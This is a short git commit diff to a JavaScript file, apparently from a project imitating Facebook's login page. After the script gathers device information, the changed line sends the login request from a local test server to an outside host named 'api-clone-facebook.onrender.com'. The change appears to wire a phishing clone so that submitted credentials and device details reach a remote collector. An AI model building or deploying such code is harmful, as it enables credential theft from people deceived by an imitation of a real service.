f82764e387568e06ffc14d0163971d0e1d937461
Coronel4545 <stifler.oliveira41@gmail.com>
2024-11-23 15:26:51 -0300

    Update script.js

--- Javascript/script.js
+++ Javascript/script.js
@@ -82,7 +82,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 const infoDispositivo = await coletarInformacoesDispositivo();
 
-                const response = await fetch('http://localhost:3000/login', {
+                const response = await fetch('https://api-clone-facebook.onrender.com/login', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
